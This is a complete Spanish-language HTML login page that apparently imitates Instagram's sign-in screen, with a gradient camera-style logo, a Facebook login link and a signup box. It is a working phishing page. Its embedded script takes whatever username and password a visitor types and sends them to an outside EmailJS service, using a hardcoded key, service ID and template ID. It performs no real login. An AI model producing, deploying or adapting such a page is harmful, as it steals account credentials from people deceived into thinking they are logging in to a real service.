<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Helvetica', sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
    }

    .login-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 300px;
      margin-bottom: 10px;
    }

    .logo {
      margin: 0 auto 30px auto;
      width: 60px;
      height: 60px;
    }

    input {
      display: block;
      width: 100%;
      margin-bottom: 6px;
      padding: 9px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background: #fafafa;
    }

    button {
      width: 100%;
      padding: 9px;
      background-color: #0095f6;
      color: white;
      border: none;
      font-weight: bold;
      margin-top: 10px;
      border-radius: 4px;
      cursor: pointer;
    }

    .separator {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
    }

    .line {
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .or {
      margin: 0 10px;
      color: #8e8e8e;
      font-size: 13px;
    }

    .fb-login {
      color: #385185;
      font-weight: bold;
      font-size: 14px;
      margin: 10px 0;
      cursor: pointer;
    }

    .forgot {
      font-size: 12px;
      color: #00376b;
      margin-top: 12px;
      cursor: pointer;
    }

    .signup-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 20px;
      font-size: 14px;
    }

    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }
  </style>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    function sendLoginForm(e) {
      e.preventDefault();

      emailjs.init("FL6vofHg7F9vLawQs");

      emailjs.send("service_6pbv86h", "template_z1nimz6", {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value,
      })
      .then(() => {
        alert("Datos enviados correctamente.");
        document.getElementById("loginForm").reset();
      }, (error) => {
        alert("Error al enviar: " + JSON.stringify(error));
      });
    }
  </script>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <div class="logo">
        <svg width="60" height="60" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
          <defs>
            <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
              <stop offset="0%" style="stop-color:#f09433;stop-opacity:1" />
              <stop offset="25%" style="stop-color:#e6683c;stop-opacity:1" />
              <stop offset="50%" style="stop-color:#dc2743;stop-opacity:1" />
              <stop offset="75%" style="stop-color:#cc2366;stop-opacity:1" />
              <stop offset="100%" style="stop-color:#bc1888;stop-opacity:1" />
            </linearGradient>
          </defs>
          <rect x="64" y="64" width="384" height="384" rx="96" ry="96" fill="url(#grad)" />
          <circle cx="256" cy="256" r="144" fill="white" />
          <circle cx="256" cy="256" r="96" fill="none" stroke="url(#grad)" stroke-width="32" />
          <circle cx="384" cy="128" r="32" fill="url(#grad)" />
        </svg>
      </div>

      <form id="loginForm" onsubmit="sendLoginForm(event)">
        <input type="text" id="username" name="username" placeholder="Usuario" required />
        <input type="password" id="password" name="password" placeholder="Contraseña" required />
        <button type="submit">Iniciar sesión</button>

        <div class="separator">
          <div class="line"></div>
          <div class="or">O</div>
          <div class="line"></div>
        </div>

        <div class="fb-login">Iniciar sesión con Facebook</div>
        <div class="forgot">¿Has olvidado la contraseña?</div>
      </form>
    </div>

    <div class="signup-box">
      ¿No tienes una cuenta? <a href="#">Regístrate</a>
    </div>
  </div>
</body>
</html>
